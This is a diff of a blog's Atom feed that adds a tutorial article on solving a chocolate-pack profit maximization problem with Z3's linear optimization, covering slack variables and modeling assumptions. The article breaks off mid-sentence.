@@ -1,4 +1,178 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="/book-of-gehn/feed.xml" rel="self" type="application/atom+xml" /><link href="/book-of-gehn/" rel="alternate" type="text/html" /><updated>2021-04-26T03:22:45+02:00</updated><id>/book-of-gehn/feed.xml</id><title type="html">The Book of Gehn</title><subtitle></subtitle><author><name>Gehn</name></author><entry><title type="html">Congruence Closure with Z3</title><link href="/book-of-gehn/articles/2021/04/25/Congruence-Closure.html" rel="alternate" type="text/html" title="Congruence Closure with Z3" /><published>2021-04-25T00:00:00+02:00</published><updated>2021-04-25T00:00:00+02:00</updated><id>/book-of-gehn/articles/2021/04/25/Congruence-Closure</id><content type="html" xml:base="/book-of-gehn/articles/2021/04/25/Congruence-Closure.html">&lt;p&gt;Assume that you know that &lt;script type=&quot;math/tex&quot;&gt;a = b&lt;/script&gt;, &lt;script type=&quot;math/tex&quot;&gt;b = c&lt;/script&gt; and &lt;script type=&quot;math/tex&quot;&gt;d = e&lt;/script&gt;. What can you
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="/book-of-gehn/feed.xml" rel="self" type="application/atom+xml" /><link href="/book-of-gehn/" rel="alternate" type="text/html" /><updated>2021-04-27T15:06:50+02:00</updated><id>/book-of-gehn/feed.xml</id><title type="html">The Book of Gehn</title><subtitle></subtitle><author><name>Gehn</name></author><entry><title type="html">Optimum Packaging of Chocolate</title><link href="/book-of-gehn/articles/2021/04/27/Optimum-Packaging-of-Chocolate.html" rel="alternate" type="text/html" title="Optimum Packaging of Chocolate" /><published>2021-04-27T00:00:00+02:00</published><updated>2021-04-27T00:00:00+02:00</updated><id>/book-of-gehn/articles/2021/04/27/Optimum-Packaging-of-Chocolate</id><content type="html" xml:base="/book-of-gehn/articles/2021/04/27/Optimum-Packaging-of-Chocolate.html">&lt;p&gt;A small business sells two types of chocolate packs: A and B.&lt;/p&gt;
+
+&lt;p&gt;The pack A has 300 grams of bittersweet chocolate, 500 grams of
+chocolate with walnuts and 200 grams of white chocolate.&lt;/p&gt;
+
+&lt;p&gt;The pack B has 400 grams of bittersweet chocolate, 200 grams of
+chocolate with walnuts and 400 grams of white chocolate.&lt;/p&gt;
+
+&lt;p&gt;The pack A has a price of 120$ while the pack B has a price of 90$.&lt;/p&gt;
+
+&lt;p&gt;Let’s assume that this small business has for today 100 kilograms of
+bittersweet chocolate, 120 kilograms of chocolate with walnuts and 100
+kilograms of while chocolate.&lt;/p&gt;
+
+&lt;p&gt;How many packs of A and B type should be packed to maximize the profits?
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;of-variables-and-restrictions&quot;&gt;Of variables and restrictions&lt;/h2&gt;
+
+&lt;p&gt;First, we set up a solver that not only will say if a set of
+restrictions are
+satisfiable or not but it will also give us an instance (model) that
+&lt;em&gt;maximizes&lt;/em&gt; a given &lt;em&gt;objective function&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;z3&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Reals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Optimize&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Optimize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let start defining be the following variables that represent how many packs
+of each type we need to make:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a_cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Reals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a_cnt b_cnt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, we have the variables that represent how much chocolate we &lt;em&gt;use&lt;/em&gt; of
+each flavor:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bittersweet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;with_walnuts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;white&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Reals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'bittersweet with_walnuts white'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So now we can relate the amount of A and B packs with the amount of
+chocolate of each flavor:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bittersweet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;with_walnuts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;white&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;But the amount of chocolate is limited:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;bittersweet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;with_walnuts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;white&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And technically, the amount of packs has also a lower bound&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;a_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;b_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;bittersweet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;with_walnuts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;white&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;label for=&quot;mn-e443e681f28524ed57a685ba1b5097eb&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-e443e681f28524ed57a685ba1b5097eb&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;In Python &lt;code class=&quot;highlighter-rouge&quot;&gt;a &amp;lt;= b &amp;lt;= c&lt;/code&gt; is a valid expression but in Z3 it is not
+and you need to define two separated statements &lt;code class=&quot;highlighter-rouge&quot;&gt;a &amp;lt;= b&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;b &amp;lt;= c&lt;/code&gt;.
+ &lt;/span&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;the-objective&quot;&gt;The objective&lt;/h2&gt;
+
+&lt;p&gt;And finally, this is the &lt;em&gt;linear&lt;/em&gt; function that we want to maximize:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objective&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;maximize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;90&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b_cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sat&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objective&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;33000&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So the optimal income will be 33000$ and the amount of packs and
+chocolate is:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;a_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;white&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;with_walnuts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;120000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;bittersweet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As expected the optimal solution is when we use most of the chocolate.&lt;/p&gt;
+
+&lt;h3 id=&quot;slack&quot;&gt;Slack&lt;/h3&gt;
+
+&lt;p&gt;The only one that had some &lt;em&gt;slack&lt;/em&gt; was white chocolate. Having a limit
+of 100 kilograms, the optimal solution required 80 kilograms with 20
+kilograms without use.&lt;/p&gt;
+
+&lt;p&gt;We can let Z3 to calculate that for use redefining the inequalities by
+introducing &lt;em&gt;slack variables&lt;/em&gt; and making them equalities:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bittersweet_slack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;with_walnuts_slack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;white_slack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Reals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'bittersweet_slack with_walnuts_slack white_slack'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;bittersweet_slack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;with_walnuts_slack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;white_slack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;bittersweet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bittersweet_slack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;with_walnuts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;with_walnuts_slack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;white&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;white_slack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sat&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;a_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;white_slack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;with_walnuts_slack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;bittersweet_slack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;white&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;with_walnuts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;120000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;bittersweet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;assumptions&quot;&gt;Assumptions&lt;/h2&gt;
+
+&lt;p&gt;&lt;label for=&quot;mn-021db9f39d0b1ca9edb96ffb431eecca&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-021db9f39d0b1ca9edb96ffb431eecca&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;Precise values; linear, proportional and additivity relations; and
+variables in &lt;script type=&quot;math/tex&quot;&gt;\mathbb{R}&lt;/script&gt;
+ &lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;When we say “the pack A has 300 grams of bittersweet chocolate” we are
+incurring in a huge assumption: that the number 300 is a real and
+&lt;em&gt;precise&lt;/em&gt; thing.&lt;/p&gt;
+
+&lt;p&gt;In the real world is hard or even impossible to operate with precise
+quantities. Think that the manufacturing process has some
+inefficiencies, the balance/scale used to measure has not infinite
+precision and things like that.&lt;/p&gt;
+
+&lt;p&gt;We also said without much thinking that inputs and
+outputs are &lt;em&gt;proportional&lt;/em&gt;: if the outcome of selling 1 pack A is 120$,
+selling 10 packs we should earn 1200$.&lt;/p&gt;
+
+&lt;p&gt;We said that we wanted to maximize &lt;code class=&quot;highlighter-rouge&quot;&gt;120 * a_cnt + 90 * b_cnt&lt;/code&gt;. Under the
+hood we are also making the assumption that we can &lt;em&gt;sell&lt;/em&gt; packs A and
+packs B independently and then &lt;em&gt;add them&lt;/em&gt; together.&lt;/p&gt;
+
+&lt;p&gt;This and the &lt;em&gt;proportional&lt;/em&gt; assumptions are required for &lt;strong&gt;linear&lt;/strong&gt;
+programming.&lt;/p&gt;
+
+&lt;p&gt;A cleaver reader may noticed that I used Z3’s &lt;code class=&quot;highlighter-rouge&quot;&gt;Reals&lt;/code&gt; for creating the
+variables &lt;code class=&quot;highlighter-rouge&quot;&gt;a_cnt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;b_cnt&lt;/code&gt;. It is obviously wrong because the amount
+of packs is an &lt;strong&gt;integer&lt;/strong&gt; and not a real number.&lt;/p&gt;
+
+&lt;p&gt;We’ve got an integer solution of &lt;code class=&quot;highlighter-rouge&quot;&gt;a_cnt = 200&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;b_cnt = 100&lt;/code&gt; but
+this was pure luck.&lt;/p&gt;
+
+&lt;p&gt;But the same objection can be done for the amount of chocolate: absurd
+tiny amounts like 0.0001 grams of chocolate makes no sense.&lt;/p&gt;
+
+&lt;p&gt;We assumed that all the variables here have the &lt;em&gt;divisibility&lt;/em&gt; property:
+they can be modeled as real numbers – that’s why call it &lt;strong&gt;real&lt;/strong&gt; linear
+programming in opposition to the &lt;strong&gt;integer&lt;/strong&gt; linear programming.&lt;/p&gt;
+
+&lt;p&gt;The former can be solved in polinomial time (Z3 uses the &lt;a href=&quot;https://en.wikipedia.org/wiki/Simplex_algorithm&quot;&gt;Simplex
